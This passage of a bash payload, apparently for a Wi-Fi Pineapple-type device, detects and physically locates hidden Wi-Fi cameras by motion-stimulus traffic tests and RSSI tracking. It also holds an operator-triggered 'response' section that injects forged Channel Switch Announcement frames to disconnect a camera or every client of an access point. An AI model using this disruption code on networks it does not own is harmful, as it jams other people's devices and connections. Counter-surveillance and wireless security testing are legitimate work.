    if [ "$AUTO_LOCATE" = 1 ] && confirm "Locate ${ID_LABEL[$mac]:-${mac:9}}?"; then locate_target "$mac"; return 0; fi
  fi
  local -a items=(); [ "$mode" = stim ] && items+=("Repeat (${RUNS_N[$mac]}/$MAX_RUNS)")
  [ "$RESPONSE" = 1 ] && items+=("$(disrupt_row "$mac")")
  items+=("Locate" "Watch again" "Back")
  pick_list "$V_WORD ${mac:9}" "Back" "${items[@]}" || return 0
  case "$PICK" in
    "Repeat"*) stimulus_test "$mac" ;;
    "Disrupt"*) disrupt_menu "$mac" ;;
    "Locate") locate_target "$mac" ;;
    "Watch again") WATCH_AGAIN=$((WATCH_AGAIN + 1)); (( WATCH_AGAIN <= 5 )) && live_view "$mac" ;;
  esac
}
WATCH_AGAIN=0

# stimulus_test mac -> quiet gate, PROMPT, baseline/stimulus/post windows, EVENT scoring, repeats
stimulus_test() {
  local mac="$1" n secs ub us up delta10 asym_s rec10 i rc
  RUNS_N[$mac]=$(( ${RUNS_N[$mac]:-0} + 1 )); n=${RUNS_N[$mac]}
  if (( n > MAX_RUNS )); then RUNS_N[$mac]=$MAX_RUNS; LOG "max runs; move closer or try Live view"; return 0; fi
  secs=$(( WIN_BASE_S + 10 ))
  watch_prepare "$mac" $(( QUIET_SECS * 4 + 10 )) || return 1      # the gate may run four captures before the baseline lock
  BATT_W0="$BATT"; watch_tsv_hdr
  # quiet gate: wait for < 2 big uplink fr/s over 15 s (cap 60 s)
  LOG "waiting for camera to settle"
  for ((i = 0; i < 4; i++)); do
    start_caps A; sleep "$QUIET_SECS"; stop_caps A; window_metrics A
    (( WM_UPRATE10 < 20 )) && break
  done
  unlock_target
  PROMPT "Baseline ${WIN_BASE_S}s. Keep still." 2>/dev/null
  lock_target "$WATCH_BSSID" "$secs" >/dev/null; rc=$?
  (( rc == 2 )) && { LOG yellow "$LOCK_TEXT"; unlock_target; set_state SCAN; return 1; }
  (( rc == 3 )) && LOG yellow "$LOCK_TEXT"
  start_caps A; sleep "$WIN_BASE_S"; stop_caps A; window_metrics A; ub=$WM_UPRATE10; local ub_f=$WM_UF
  VIBRATE 100 2>/dev/null
  ALERT "Now move ${WIN_STIM_S}s" "walk, wave, lights" 2>/dev/null
  PINEAPPLE_EXAMINE_BSSID "$WATCH_BSSID" $(( WIN_STIM_S + WIN_POST_S + 15 )) >/dev/null 2>&1
  start_caps B; sleep "$WIN_STIM_S"; stop_caps B; window_metrics B; us=$WM_UPRATE10; asym_s=$WM_ASYM10
  LOG "settling ${WIN_POST_S}s"
  start_caps A; sleep "$WIN_POST_S"; stop_caps A; window_metrics A; up=$WM_UPRATE10
  (( WM_ASYM10 > asym_s )) && asym_s=$WM_ASYM10
  unlock_target
  local peak=$us; (( up > peak )) && peak=$up
  local base=$ub; (( base < THR_DELTA_FLOOR * 10 )) && base=$(( THR_DELTA_FLOOR * 10 ))
  delta10=$(( peak * 10 / base )); rec10=$(( up * 10 / (us > 0 ? us : 1) ))
  V_WORD=NONE; V_BEH=0; V_GATE=0; V_EVENT=0
  if (( ub_f == 0 && us == 0 && up == 0 )); then
    V_WORD=INCONCLUSIVE; V_TEXT="no frames from the target in any window: lock, band or sleep"
  elif (( delta10 >= THR_DELTA10 && peak >= THR_STIM_UP * 10 && asym_s >= THR_ASYM10 )); then
    V_WORD=EVENT; V_BEH=$W_EVENT; V_GATE=$W_EVENT; V_EVENT=1; V_TEXT="responds to motion: likely camera"
  elif (( delta10 >= THR_DELTA_WEAK10 && peak >= THR_STIM_UP * 10 && asym_s >= THR_ASYM10 )); then
    V_WORD="EVENT?"; V_BEH=$W_EVENT_WEAK; V_GATE=$W_EVENT_WEAK; V_EVENT=1; V_TEXT="uplink rose when you moved (weak)"
  else
    V_WORD=NONE; V_TEXT="no change: asleep, disarmed, in cooldown, local-record, or not a camera; identity only"
    (( delta10 < 12 && ub < 20 )) && V_WORD=IDLE
  fi
  [ "${VEND_TYPE[$mac]}" = VENDOR_ENDPOINT ] && (( V_EVENT )) && V_TEXT="responds to motion: webcam or camera; vendor ${VENDOR[$mac]}"
  RUNS+=("$n|$delta10|$peak|$asym_s|$V_WORD")
  watch_tsv_row stim "$n" $(( WIN_BASE_S + WIN_STIM_S + WIN_POST_S )) "$(fmt10 "$peak")" - "$( (( asym_s >= 0 )) && fmt10 "$asym_s" || printf -- -)" - "$(fmt10 "$delta10")" "$(fmt10 "$rec10")" "$WM_DROPS" "$V_WORD"
  if [ "$V_WORD" = INCONCLUSIVE ]; then
    set_state INCONCLUSIVE; LOG yellow "INCONCLUSIVE"$'\n'"$V_TEXT"$'\n'"$LOCK_TEXT"; BEH_VERDICT[$mac]="INCONCLUSIVE"
  else
    apply_verdict "$mac"
    LOG "base $(fmt10 "$ub") stim $(fmt10 "$us") post $(fmt10 "$up") big/s"$'\n'"delta $(fmt10 "$delta10") post x$(fmt10 "$rec10")"
    [ "$V_WORD" = NONE ] || [ "$V_WORD" = IDLE ] && LOG "cooldown hints: Blink 30-60 s, Ring ~dwell, Wyze free 5 min"
    summary_card "$mac" stim "$peak" 0 "$asym_s" -
  fi
  BASELINE_NEXT=1; PREV_PKT=(); PREV_T=()
  return 0
}

watch_menu() {
  local mac="$1"
  # User payload only: an AP read off the air more than ASSOC_TTL ago is looked at again before it
  # is acted on. Here rather than at the card, so the Watch offers of the scan funnel get it too.
  command -v assoc_refresh >/dev/null 2>&1 && assoc_refresh "$mac"
  watchable "$mac" || { LOG "Watch n/a for ${mac:9}"; return 0; }
  WATCH_AGAIN=0; RUNS=()
  pick_list "Watch ${ID_LABEL[$mac]:-?} ${mac:9}" "Live view" "Live view" "Stimulus test (~90 s)" "Back" || return 0
  case "$PICK" in
    "Live view") live_view "$mac" ;;
    "Stimulus test"*) stimulus_test "$mac" ;;
  esac
  return 0
}

# ---- locate (MONITOR RSSI loop) ----
locate_target() {
  local mac="$1" pid tier=0 last_tier=0 med raw n size0 size1 quiet=0 silent_cap rc t0 i
  local -a ring=() lines=()
  [ -n "${ROLE[$mac]}" ] || return 0
  silent_cap=$LOCATE_SILENT_CLI; [ "${ROLE[$mac]}" != cli ] && silent_cap=$LOCATE_SILENT_AP
  rm -f /tmp/cs_signal
  _pineap MONITOR "$mac" any rate=200 timeout=600 >/tmp/cs_signal 2>&1 & pid=$!; child_add "$pid"
  WATCH_LOCKED=1; LAST_LOCK_TS=$EPOCHSECONDS
  sleep 0.5
  if ! kill -0 "$pid" 2>/dev/null; then LOG "MONITOR failed to start"; child_del "$pid"; WATCH_LOCKED=0; return 1; fi
  LOG "[$MODE] Locate ${ID_LABEL[$mac]:-?} ${mac:9}$( [ "${ROLE[$mac]}" != cli ] && printf ' (tracking AP)')"$'\n'"A = stop. Recon paused."
  log locate "start $mac"
  t0=$EPOCHSECONDS; size0=0
  while kill -0 "$pid" 2>/dev/null; do
    if ui_ok; then timeout 1 WAIT_FOR_BUTTON_PRESS A >/dev/null 2>&1; rc=$?; (( rc == 0 )) && break; (( rc != 124 )) && sleep 1; else sleep 1; fi
    size1=$(stat -c %s /tmp/cs_signal 2>/dev/null || wc -c </tmp/cs_signal)
    if (( size1 == size0 )); then
      quiet=$((quiet + 1))
      if (( quiet >= 3 )); then set_state OFF; LOG "-- stale ${quiet}s$( (( quiet >= silent_cap )) && printf ' (quiet: idle cam?)') last ${ring[-1]:--}"; fi
      continue
    fi
    size0=$size1; quiet=0
    mapfile -t lines < <(tail -n 5 /tmp/cs_signal 2>/dev/null)
    for raw in "${lines[@]}"; do
      [[ $raw =~ ^-?[0-9]+$ ]] || continue
      [ "${ring[-1]:-x}" = "$raw" ] && continue
      ring+=("$raw"); (( ${#ring[@]} > MEDIAN_N )) && ring=("${ring[@]:1}")
    done
    n=${#ring[@]}; (( n == 0 )) && continue
    # median via insertion sort copy (no fork)
    local -a s=("${ring[@]}"); local j k tmp
    for ((j = 1; j < n; j++)); do tmp=${s[j]}; k=$((j - 1)); while (( k >= 0 && s[k] > tmp )); do s[k + 1]=${s[k]}; k=$((k - 1)); done; s[k + 1]=$tmp; done
    med=${s[$((n / 2))]}
    tier=1; (( med >= -75 )) && tier=2; (( med >= -55 )) && tier=3; (( med >= -35 )) && tier=4
    # 3 dB hysteresis against the previous tier's lower edge
    if (( tier < last_tier )); then
      case "$last_tier" in 2) (( med >= -78 )) && tier=2 ;; 3) (( med >= -58 )) && tier=3 ;; 4) (( med >= -38 )) && tier=4 ;; esac
    fi
    if (( tier != last_tier )); then set_state "LOC$tier"; last_tier=$tier; fi
    case "$tier" in 1) RINGTONE "W:d=32,o=4,b=200:c" ;; 2) RINGTONE "M:d=32,o=5,b=200:c" ;; 3) RINGTONE "S:d=32,o=6,b=200:c" ;; 4) RINGTONE "H:d=32,o=7,b=200:c" ;; esac >/dev/null 2>&1 &
    i=$(( (med + 95) / 3 )); (( i < 1 )) && i=1; (( i > 20 )) && i=20
    LOG "${med}dBm [$(printf '%*s' "$i" '' | tr ' ' '#')$(printf '%*s' $((20 - i)) '' | tr ' ' '-')] raw ${ring[-1]}"
  done
  kill -TERM "$pid" 2>/dev/null; wait "$pid" 2>/dev/null; child_del "$pid"
  _pineap EXAMINE CANCEL >/dev/null 2>&1; WATCH_LOCKED=0; LAST_LOCK_TS=$EPOCHSECONDS
  log locate "stop $mac secs=$((EPOCHSECONDS - t0)) last=${ring[-1]:--}"
  set_state SCAN; BASELINE_NEXT=1; PREV_PKT=(); PREV_T=()
  return 0
}
# --- response rung begin ---
# Operator-driven disconnect. RESPONSE defaults to 1, so the rung is present; nothing transmits
# until the operator picks an attack and clears the confirm. There is no path from a detection to
# the air that does not pass through a dialog -- AUTO_RESPOND only raises the offer, never fires it.
RESP_HDR='#epoch|mac|role|bssid|target|ch|band|badge|rsn_caps|beacon_prot|attack|cmd|lock|pk_before|pk_after|verdict'
R_BSSID=""; R_TARGET=""; R_CH=0; R_BAND='?'

resp_target() {   # resp_target <mac> -> sets R_BSSID R_TARGET R_CH R_BAND; rc 1 when unattackable
  local mac="$1" ap
  R_BSSID=""; R_TARGET=""; R_CH="${CH[$mac]:-0}"; R_BAND="${BAND[$mac]:-?}"
  if [ "${ROLE[$mac]}" = cli ]; then
    ap="${AP_OF[$mac]:--}"
    [ "$ap" = - ] || [ -z "$ap" ] && return 1      # unassociated: no BSS to announce from
    R_BSSID="$ap"; R_TARGET="$mac"
    [ -n "${CH[$ap]}" ] && [ "${CH[$ap]}" != - ] && R_CH="${CH[$ap]}"   # a client rides its AP's channel
    [ -n "${BAND[$ap]}" ] && R_BAND="${BAND[$ap]}"
  else
    R_BSSID="$mac"; R_TARGET="ff:ff:ff:ff:ff:ff"
  fi
  [[ $R_CH =~ ^[0-9]+$ ]] || return 1
  (( R_CH > 0 )) || return 1
  if [ "$R_BAND" = '?' ]; then    # no frequency seen for the target or its AP: the channel number decides
    if (( R_CH <= 14 )); then R_BAND=2; elif (( R_CH >= 36 && R_CH <= 177 )); then R_BAND=5; fi
  fi
  return 0
}

recon_stat() {   # recon_stat <mac> -> "packets last_seen", rc 1 when recon has no such row
  local mac="${1,,}" m a pk sig pr fr t ch ssid hid
  while IFS='|' read -r m a pk sig pr fr t ch; do
    [ "${m,,}" = "$mac" ] && { printf '%s %s' "${pk:-0}" "${t:-0}"; return 0; }
  done < <(recon_lines CLIENTS)
  while IFS='|' read -r m pk ssid ch fr sig hid t; do
    [ "${m,,}" = "$mac" ] && { printf '%s %s' "${pk:-0}" "${t:-0}"; return 0; }
  done < <(recon_lines APS)
  return 1
}

# resp_verdict <pk0> <t0> <pk1> <t1> <present_after> -> MOVED | NO_EFFECT | INCONCLUSIVE
# Every kernel-side drop path reports success, so "we sent it" proves nothing. Only the target's
# own behaviour afterwards does, and a stalled packet counter is the strongest signal recon gives.
resp_verdict() {
  local p0="$1" t0="$2" p1="$3" t1="$4" present="$5"
  # The baseline is tested FIRST, and this order is load-bearing. present=0 means "dropped out of
  # recon", which only means anything if the subject was in recon to begin with. A client Recon
  # never listed has p0 '-' and present 0, and judging presence first scored that MOVED -- a green
  # RESPOND_HIT, with 'pk_before=- pk_after=-' in the loot, for a device we never measured. The
  # client-row path in resp_fire synthesizes exactly that subject, so on firmware with no usable
  # association it was the common case, not an edge one.
  [[ $p0 =~ ^[0-9]+$ ]] || { printf 'INCONCLUSIVE'; return 0; }  # no usable baseline: nothing to compare
  [ "$present" = 0 ] && { printf 'MOVED'; return 0; }            # was measured before, gone now
  [[ $p1 =~ ^[0-9]+$ ]] || { printf 'INCONCLUSIVE'; return 0; }
  (( p1 > p0 )) && { printf 'NO_EFFECT'; return 0; }            # still transmitting
  [ "$t1" = "$t0" ] && { printf 'MOVED'; return 0; }            # counter stalled, nothing newer seen
  printf 'INCONCLUSIVE'
}

resp_write() {   # resp_write <mac> <badge> <attack> <cmd> <lock> <pk0> <pk1> <verdict> [measured target]
  local f="$LOOT_DIR/responses.tsv" bp=- tgt="${9:-$R_TARGET}"
  [ "$POSTURE_EXT" = - ] || bp=$(hex_octet "$POSTURE_EXT" 10 2>/dev/null) || bp=-
  [ -s "$f" ] || printf '%s\n' "$RESP_HDR" >"$f" 2>/dev/null
  printf '%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s\n' \
    "$EPOCHSECONDS" "$1" "${ROLE[$1]:--}" "$R_BSSID" "$tgt" "$R_CH" "$R_BAND" \
    "$2" "${POSTURE_RSN:--}" "$bp" "$3" "$4" "$5" "$6" "$7" "$8" >>"$f" 2>/dev/null
}

# resp_snapshot <scope> -> RS_PK/RS_T (packets, last-seen) for the subjects of the attempt, from one
# Recon read. The subjects are whatever the chosen attack reaches, which is NOT what the picked row
# implies: CSA and BOTH transmit BSS-wide even from a client row (see attack_scope), so measuring
# only the picked device would report a one-camera result as the outcome of a BSS-wide transmit and
# leave the rest of the BSS out of the loot. scope cli measures the one target; scope bss measures
# the BSSID's visible, non-random clients.
# The picked target is always a subject, even behind a randomised MAC the bss sweep otherwise skips.
# The AP's own counter is never the subject: it keeps beaconing whatever happens to its clients.
declare -A RS_PK RS_T
# The membership set for the attempt, and the BSSID it was gathered for. Paired on purpose: a set
# left over from a previous target must never be applied to this one, which is the bug posture_of
# documents for its caps globals.
declare -A RESP_MEMBERS; RESP_MEMBERS_BSS=''
BSS_ITMAX=0; BSS_RECS=0; BSS_SHORT=0; BSS_TRUNC=0; BSS_RUNT=0; MEMBERS_TEXT=''; MEMBERS_WHY=''

# resp_members <bssid> -> 0 with RESP_MEMBERS filled, or 1 with MEMBERS_WHY set to one of
# NO_CAPTURE (no tcpdump, or tcpdump refused the filter), SNAP_SHORT (frames arrived but every
# record was too short to hold addr2 -- raise CLI_CAP_SNAP) or NO_CLIENTS (armed, listened, nobody
# there). Three different answers: "we could not look", "we looked through too small a window" and
# "the BSS is empty" are not the same finding, and before this existed they were all one silence.
resp_members() {
  local bss="${1,,}" f out rc kk vv
  RESP_MEMBERS=(); RESP_MEMBERS_BSS=''; MEMBERS_TEXT=''; MEMBERS_WHY=''
  BSS_ITMAX=0; BSS_RECS=0; BSS_SHORT=0; BSS_TRUNC=0; BSS_RUNT=0
  if [ "$HAVE_TCPDUMP" != 1 ]; then
    MEMBERS_WHY=NO_CAPTURE; MEMBERS_TEXT="no tcpdump: cannot read who is on ${bss:9}"; return 1
  fi
  if ! f=$(capture_bss "$bss"); then
    MEMBERS_WHY=NO_CAPTURE; MEMBERS_TEXT="capture did not arm on ${bss:9}"; return 1
  fi
  out=$(bss_clients "$f" "$bss"); rc=$?; rm -f "$f"
  if (( rc != 0 )); then         # bad magic, or too short to be a pcap: we could not look, which is
    MEMBERS_WHY=NO_CAPTURE       # not the same answer as looking and finding nobody
    MEMBERS_TEXT="capture on ${bss:9} is not a readable pcap"; return 1
  fi
  while read -r kk vv; do        # a here-string, so these land in THIS shell, not a subshell
    case "$kk" in
      ITMAX) BSS_ITMAX="$vv" ;; RECS) BSS_RECS="$vv" ;; SHORT) BSS_SHORT="$vv" ;;
      TRUNC) BSS_TRUNC="$vv" ;; RUNT) BSS_RUNT="$vv" ;;
      CLI)   [ -n "$vv" ] && RESP_MEMBERS[$vv]=1 ;;
    esac
  done <<<"$out"
  if (( ${#RESP_MEMBERS[@]} == 0 )); then
    if (( BSS_TRUNC > 0 )); then     # a record AT the snaplen was cut: the snap is the knob
      MEMBERS_WHY=SNAP_SHORT
      MEMBERS_TEXT="snap $CLI_CAP_SNAP too small for radiotap $BSS_ITMAX: raise CLI_CAP_SNAP"
    else
      MEMBERS_WHY=NO_CLIENTS; MEMBERS_TEXT="no clients heard on ${bss:9} in ${CLI_CAP_SECS}s"
    fi
    return 1
  fi
  RESP_MEMBERS_BSS="$bss"
  # The same fact read the other way: every station heard here talks to this BSSID. The user payload
  # keeps it as each of those client rows' AP (assoc_learn_members); the hooks carry no such function.
  command -v assoc_learn_members >/dev/null 2>&1 && assoc_learn_members "$bss"
  return 0
}
resp_snapshot() {
  local scope="${1:-cli}" m a pk sig pr fr t ch s
  RS_PK=(); RS_T=()
  while IFS='|' read -r m a pk sig pr fr t ch; do
    m=${m,,}; a=${a,,}
    if [ "$scope" = bss ]; then
      # UNION, not replacement. The ap_mac test is the identity transform on real firmware (where
      # $a is always "-") and still the right answer if a firmware ever supplies association; the
      # membership set is what makes the sweep work today. Replacing it breaks 5 of the 9 snapshot
      # selftest cases, whose fixtures carry an ap_mac column no shipped firmware emits.
      # The set is ignored unless it was gathered for THIS BSSID.
      [ "$a" = "$R_BSSID" ] || { [ "$RESP_MEMBERS_BSS" = "$R_BSSID" ] && [ -n "${RESP_MEMBERS[$m]+x}" ]; } || continue
      [ "$m" != "$R_TARGET" ] && is_rand "$m" && continue
    else [ "$m" = "$R_TARGET" ] || continue; fi
    RS_PK[$m]="${pk:-0}"; RS_T[$m]="${t:-0}"
  done < <(recon_lines CLIENTS)
  if [ "$R_TARGET" != ff:ff:ff:ff:ff:ff ] && [ -z "${RS_PK[$R_TARGET]+x}" ]; then   # a client row Recon lists as an AP
    if s=$(recon_stat "$R_TARGET"); then read -r pk t <<<"$s"; RS_PK[$R_TARGET]="$pk"; RS_T[$R_TARGET]="$t"; fi
  fi
}
# resp_aggregate <moved> <no_effect> <inconclusive> -> one word for the whole attempt
resp_aggregate() {
  (( $2 > 0 )) && { printf 'NO_EFFECT'; return 0; }           # any subject kept transmitting
  (( $1 > 0 && $3 == 0 )) && { printf 'MOVED'; return 0; }     # every subject went quiet
  printf 'INCONCLUSIVE'
}

# csa_newchan -> the New Channel Number to announce, or empty when no honest answer exists.
# A CSA naming the channel the target is already on announces no move: with mode 0 the kernel
# discards it before reading the count (mlme.c:8351), and pagerinj refuses it outright without
# --allow-same-chan. So auto picks a DIFFERENT channel in the same band. Deliberately a LEGAL one:
# the open question is whether a count >= 1 denies reconnection, and that needs the client to
# actually attempt the move. An illegal channel would confound "refused to move" with "could not".
csa_newchan() {
  (( CSA_CHAN > 0 )) && { printf '%s' "$CSA_CHAN"; return 0; }
  case "$R_BAND" in
    2) (( R_CH >= 7 )) && printf '1'  || printf '11' ;;
    5) (( R_CH == 36 )) && printf '40' || printf '36' ;;
    6) (( R_CH == 37 )) && printf '41' || printf '37' ;;
    *) printf '' ;;      # band unknown: refuse to guess, the caller falls back to the firmware
  esac
}

# csa_issue -> 0 when a CSA was issued, non-zero when nothing was. Sets CSA_CMD (what the loot
# should name) and CSA_ERR (the diagnostic), because the two senders disagree about which signal
# means failure:
#   hak5cmd  exits 0 on EVERY path including its errors and writes them to stderr, so STDERR is the
#            only signal and rc is worthless (measured 2026-11-05).
#   pagerinj returns `failed && !sent ? 1 : 0` and prints its sent=/failed= summary to stderr even
#            on success, so RC is the signal and testing stderr would report failure every time.
# Getting that backwards either way files a fabricated result, which is the whole thing this rung
# exists to prevent.
# pagerinj reads --secs 0 as "transmit until SIGINT/SIGTERM" (its own usage, dev/injector/pagerinj.c),
# and csa_issue runs it in the FOREGROUND, so a hand-edited CSA_INJ_SECS=0 would park resp_fire
# forever with a transmitter running that no teardown could reach -- the watchdog and kill_children
# only TERM pids listed in CHILD_FILE. Neither knob is starred, so the only route to a bad value is
# a hand edit of the config block, which is exactly what "Edit these here" invites. Clamp both to a
# finite window ONCE so the invocation and resp_fire's lock budget cannot disagree, and log it when
# it bites rather than silently overriding what the operator wrote. Idempotent: called from both.
# BusyBox's timeout accepts -k on recent builds and REJECTS it on older ones, and every other
# timeout call in this payload is the bare `timeout N cmd` form -- so -k is a new syntax dependency
# that no measurement on this device covers. An unsupported flag would make the injector fail with a
# usage error on every single CSA, which is a worse failure than the soft bound -k exists to harden.
# So probe once and fall back. Without -k the cap still bounds any child that honours SIGTERM, which
# the shipped pagerinj does (it sets a flag and its nanosleep returns EINTR); what is lost is the
# guarantee against a child that ignores it.
TIMEOUT_K_PROBED=0; declare -a TIMEOUT_K=()
timeout_k() {
  (( TIMEOUT_K_PROBED )) && return 0
  TIMEOUT_K_PROBED=1
  if timeout -k 1 1 true >/dev/null 2>&1; then TIMEOUT_K=(-k 5)
  else log resp "timeout has no -k: the injector cap will TERM but cannot KILL"; fi
  return 0
}

csa_clamp() {
  local s=$CSA_INJ_SECS w=$CSA_INJ_WAIT
  (( CSA_INJ_SECS < 1 ))  && CSA_INJ_SECS=1
  (( CSA_INJ_SECS > 60 )) && CSA_INJ_SECS=60
  (( CSA_INJ_WAIT < 1 ))  && CSA_INJ_WAIT=1
  (( CSA_INJ_WAIT > 60 )) && CSA_INJ_WAIT=60
  [ "$s" = "$CSA_INJ_SECS" ] && [ "$w" = "$CSA_INJ_WAIT" ] && return 0
  log resp "csa inject clamped: secs $s->$CSA_INJ_SECS wait $w->$CSA_INJ_WAIT"
}

CSA_CMD=''; CSA_ERR=''
csa_issue() {
  local nc rc err fw ipid
  CSA_CMD=''; CSA_ERR=''
  csa_clamp
  if [ -n "$CSA_INJECTOR" ] && [ -x "$CSA_INJECTOR" ]; then
    nc=$(csa_newchan)
    if [ -z "$nc" ]; then
      log resp "csa injector skipped: no band for $R_BSSID, cannot pick a new channel"
    else
      : >"$FIRE_ERR"
      # Registered as a child AND capped, so both teardown paths can reach a transmitter that
      # outlives its window: child_add puts it where the watchdog and kill_children look, and
      # timeout bounds it even if the pid file is lost.
      #
      # ⚠ TWO CORRECTIONS from the 2026-11-10 audit, both of which this comment previously got
      # wrong. (1) The cap was `+10` while resp_fire reserves `+2` of lock for this injector, so
      # the cap could ONLY ever fire 8 s after the lock budget it was supposed to live inside had
      # been spent -- i.e. the backstop fired exclusively in the window where the measurement that
      # follows it is already invalid. It now uses the SAME expression as the reservation in
      # resp_fire; if you change one, change both, and `csa_clamp` bounds the inputs of both.
      # (2) `wait` does NOT return the child's own status here -- it returns `timeout`'s, which is
      # 124 on expiry whatever the injector exited with (measured). The rc-is-the-signal rule for
      # pagerinj therefore does not survive the wrapper unaltered, and the classification below is
      # what restores it. `-k 5` is what makes the cap a real bound rather than a polite request:
      # plain `timeout` sends SIGTERM and then waits forever on a child that ignores it.
      timeout_k
      timeout "${TIMEOUT_K[@]}" $(( CSA_INJ_SECS + CSA_INJ_WAIT + 2 )) \
        "$CSA_INJECTOR" -i "$RECON_IF" --csa --bssid "$R_BSSID" --chan "$nc" \
        --count "$CSA_COUNT" --secs "$CSA_INJ_SECS" --wait "$CSA_INJ_WAIT" \
        >/dev/null 2>"$FIRE_ERR" &
      ipid=$!; child_add "$ipid"; wait "$ipid"; rc=$?; child_del "$ipid"
      err=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); rm -f "$FIRE_ERR"
      CSA_CMD="${CSA_INJECTOR##*/}:ch$nc:n$CSA_COUNT"   # expansion, not basename: one less command to exist
      log resp "csa inject $CSA_CMD rc=$rc${err:+ out=${err:0:200}}"
      (( rc == 0 )) && return 0
      # rc 2 means "it DID transmit and was then capped". Distinguishing it from "it sent nothing"
      # is not cosmetic: resp_fire's refusal path writes CMD_REFUSED, which asserts no frame left
      # the radio, and the harness comment on that row says in as many words that CMD_REFUSED
      # "would be a lie: a frame WAS transmitted". A capped run has pagerinj's own
      # `interrupted: sent=N failed=0` on stderr, so the evidence is right there in `err`.
      if (( rc == 124 )) || (( rc >= 128 )) || printf '%s' "$err" | grep -q 'sent=[1-9]'; then
        CSA_ERR="injector capped after transmitting (rc $rc): ${err:0:160}"
        return 2
      fi
      CSA_ERR="injector rc $rc: ${err:0:160}"
      return 1
    fi
  fi
  fw=$(response_cmd CSA)
  CSA_CMD="$fw"
  [ -n "$fw" ] && command -v "$fw" >/dev/null 2>&1 || { CSA_ERR="$fw not present"; return 1; }
  : >"$FIRE_ERR"
  "$fw" "$R_BSSID" "$R_CH" >/dev/null 2>"$FIRE_ERR"; rc=$?
  err=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); rm -f "$FIRE_ERR"
  log resp "cmd $fw rc=$rc${err:+ err=${err:0:120}}"
  (( rc == 0 )) && [ -z "$err" ] && return 0
  CSA_ERR="${err:0:160}"; return 1
}

resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was reached
  local mac="$1" k="$2" badge="$3" cmd lock rc m p0 t0 p1 t1 present verdict nmv=0 nne=0 ninc=0 n
  local scope tgt_verdict=- cap_secs lock_secs csa_secs=0 t_cap frc ferr nmeas=0 nomem=''
  local -a subjects=(); local -A P0=() T0=()
  RESP_MEMBERS=(); RESP_MEMBERS_BSS=''      # never inherit a previous target's set
  cmd=$(response_cmd "$k")
  [ -n "$cmd" ] || return 1
  if ! command -v "$cmd" >/dev/null 2>&1; then
    LOG red "$cmd not present in this firmware"; log resp "missing $cmd"; return 1
  fi
  scope=$(attack_scope "$k")      # what the command can reach, which is not what the row implies
  # The lock is taken FIRST, before any reading. One episode now covers lock -> membership capture
  # -> pre-read -> fire -> settle -> post-read -> unlock. Forced, because the capture has to happen
  # on the target's channel and the pre-read has to see the members it found. It also removes an
  # asymmetry that was quietly biasing the oracle: the pre-read used to run unlocked while the
  # post-read ran locked, and an unlocked read sees a hopping radio's thinner counters.
  cap_secs=0; [ "$scope" = bss ] && cap_secs=$(( CLI_CAP_SECS + 2 ))
  # The injector waits for a beacon to clone and then transmits for a while, all of it INSIDE the
  # locked episode, so its budget has to be in the lock or the lock expires mid-fire and the
  # post-read lands on a hopping radio -- the exact false green resp_verdict exists to prevent.
  if [ -n "$CSA_INJECTOR" ] && [ -x "$CSA_INJECTOR" ] && { [ "$k" = CSA ] || [ "$k" = BOTH ]; }; then
    csa_clamp                                 # before the budget, so a clamped run cannot outlast its lock
    csa_secs=$(( CSA_INJ_SECS + CSA_INJ_WAIT + 2 ))
  fi
  lock_secs=$(( RESP_LOCK_SECS + cap_secs + csa_secs ))   # additive: resp_clamp_lock's floor is not ours to move
  lock_target "$R_BSSID" "$lock_secs" "$R_CH"; rc=$?
  case $rc in 0) lock=ok ;; 1) lock=by-channel ;; 3) lock=unverified ;; *) lock=failed ;; esac
  if (( rc == 2 )); then
    unlock_target
    LOG red "lock failed: $LOCK_TEXT"; log resp "lock-failed $R_BSSID $LOCK_TEXT"
    resp_write "$mac" "$badge" "$k" "$cmd" "$lock" - - LOCK_FAILED
    set_state INCONCLUSIVE; return 1
  fi
  if [ "$scope" = bss ]; then
    t_cap=$EPOCHSECONDS
    # A capture that hears nothing is a REASON, never a verdict on its own. Returning here would
    # REPLACE the ap_mac path rather than add to it -- the same mistake as replacing resp_snapshot's
    # ap_mac test instead of unioning with it, one level up in the control flow. So the reason is
    # recorded and the Recon read still happens. A subject set that is empty AFTER both sources
    # used to refuse with that reason; on an AP row it now fires the broadcast anyway, logs the
    # reason to events.log and loots one INCONCLUSIVE row (operator-decided 2026-11-10; see the
    # empty-set branch below).
    resp_members "$R_BSSID" || true
    # The dwell figure the recon-side session needs for resp_clamp_lock's floor, handed over as a
    # measurement rather than a unilateral change to their function. dev/CamHound/README.md lists it
    # among the first-run markers to watch.
    log resp "members $R_BSSID n=${#RESP_MEMBERS[@]} why=${MEMBERS_WHY:-ok} itmax=$BSS_ITMAX recs=$BSS_RECS short=$BSS_SHORT trunc=$BSS_TRUNC runt=$BSS_RUNT dwell=$(( EPOCHSECONDS - t_cap ))s lock=${lock_secs}s"
    # Re-arm before the measurement, rather than sizing cap_secs to cover the parse.
    # The capture does not need a guaranteed lock: if the radio resumes hopping mid-capture we
    # simply hear fewer stations, and the member set honestly reports what it heard. The
    # MEASUREMENT does need one -- a lock expiring between the pre-read and the post-read lets the
    # post-read land on a hopping radio, whose cumulative Recon counter looks stalled, and
    # resp_verdict scores a stalled counter MOVED. That is the exact false green this rung exists
    # to prevent. Sizing a constant instead cannot be done honestly: the walker takes 2.5-9.1 s on
    # the device for a full CLI_CAP_COUNT buffer (RESPONSE.md 13a-i), so any fixed number either
    # over-locks every quiet BSS or under-locks a busy one. Re-arming costs lock_target's channel
    # read-back and is exact. Measured on the air, the dwell line above is what tells us which.
    lock_target "$R_BSSID" $(( RESP_LOCK_SECS + csa_secs )) "$R_CH"; rc=$?
    case $rc in 0) lock=ok ;; 1) lock=by-channel ;; 3) lock=unverified ;; *) lock=failed ;; esac
    if (( rc == 2 )); then
      unlock_target
      LOG red "lock lost after the capture: $LOCK_TEXT"; log resp "lock-failed-rearm $R_BSSID $LOCK_TEXT"
      resp_write "$mac" "$badge" "$k" "$cmd" "$lock" - - LOCK_FAILED
      set_state INCONCLUSIVE; return 1
    fi
    log resp "re-armed $R_BSSID $(( RESP_LOCK_SECS + csa_secs ))s for the measurement lock=$lock"
  fi
  resp_snapshot "$scope"
  for m in "${!RS_PK[@]}"; do subjects+=("$m"); P0[$m]="${RS_PK[$m]}"; T0[$m]="${RS_T[$m]}"; done
  nmeas=${#subjects[@]}      # of the subjects, how many Recon can actually score
